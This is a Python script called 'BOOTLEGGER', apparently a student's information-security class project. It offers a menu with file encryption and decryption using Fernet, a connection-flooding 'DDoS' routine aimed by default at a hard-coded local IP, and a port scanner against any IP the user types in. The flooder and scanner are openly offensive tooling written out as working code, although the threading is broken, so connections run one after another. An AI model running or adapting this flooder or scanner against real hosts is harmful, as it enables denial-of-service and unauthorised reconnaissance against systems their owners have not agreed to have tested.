#Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process       [use this if venv gets stuck]
#Youtube Tutorials used:
#https://www.youtube.com/watch?v=FGdiSJakIS4
#https://www.youtube.com/watch?v=3dEPY3HiPtI
#DISCLAIMER:
#this program was made purely for educational purposes as a university information security class final. 


import threading
import socket
import time, random, sys
from cryptography.fernet import Fernet

totalConnections = 0


#DDoS
def buildAttack():
    victim = '10.0.0.1' #this is set to my router for testing
    port = int(input("Enter the port: "))
    amount = int(input("Enter how many connections to be made: "))

    for i in range(amount):
        thread = threading.Thread(target=ddosAttack(victim, port))
        thread.start()

    print("\n\n~~~~~~~~~~~~~~~~~~~~~~\nConnection amount reached \n---> returning to main()\n\n")
    time.sleep(3)
    main()


def ddosAttack(tar, por):
    bytes = random._urandom(1024)
   
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((tar, por))
        s.sendto(("GET /" + tar + " HTTP/1.1\r\n").encode('ascii'), (tar, por))
        s.sendto((bytes*random.randint(5,15)),(tar, por))
        s.close()

        #print("\n\nbytes sent: " + str(bytes)) #printing slows down script --> keep hashed out for better performance
        global totalConnections
        totalConnections += 1
        if totalConnections % 500 == 0:
            print(totalConnections)
        return
    except:
        print("\nFailed connection on port {}".format(por) + " at target ip: " + tar) #note that this fails out at the last connection in the specified amount - shouldn't affect the punch of the script.
        return

#encrypt file
def encryptFile():  
    key = Fernet.generate_key()
    with open('theKey.key', 'wb') as theKey:
        theKey.write(key)


    print("Key has been generated.\n\n")
    fileToEnc = input("Enter filename to encrypt: ")

    with open('theKey.key', 'rb') as theKey:
        fKey = theKey.read()

    print(fKey)


    with open(fileToEnc, 'rb') as ogFile:
        theOrigin = ogFile.read()

    f = Fernet(fKey)

    newEncrypted = f.encrypt(theOrigin)

    with open('enc_file', 'wb') as encryptFile:
        encryptFile.write(newEncrypted)
    main()
#decrypt file
def decryptaFile():

    with open('theKey.key', 'rb') as theKey:
        fKey = theKey.read()
        print("key obtained\n\n")

    decFileName = input("Enter the name of the file: ")
    

    with open(decFileName, 'rb') as ogFile:
        theOrigin = ogFile.read()

    f = Fernet(fKey)
    decryptedFile = f.decrypt(theOrigin)

    with open(decFileName +"_decrypted", 'wb') as decryptFile:
        decryptFile.write(decryptedFile)
    main()

#port scan
def portScanBuilder():
    victim = input("\nEnter Target IP: ")
    portRange = int(input("\nEnter the max port to scan to: "))
    count = 1
    for i in range(portRange):
        thread = threading.Thread(target=portScanner(victim, count))
        thread.start()
        count += 1


def portScanner(tar, port):

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((tar, port))
        print("Port {}: OPEN".format(port))
        return
    except:
        print("Port {}: Closed".format(port))
        return
    
#main script
def main():
    global totalConnections
    totalConnections = 0

    print("\n     Welcome to \n~~~~~~~~~~~~~~~~~~~\nB O O T L E G G E R\n~~~~~~~~~~~~~~~~~~~\n")

    print("What would you like to do:\n 1. Encryption\n 2. Decryption \n 3. DDoS\n 4. Network Scan\n")

    userSelection = input("Enter -> (1,2,3,4): ")

    if userSelection == "1":
        encryptFile()
    if userSelection == "2":
        decryptaFile()
    if userSelection == "3":
        buildAttack()
    if userSelection == "4":
        portScanBuilder()

main()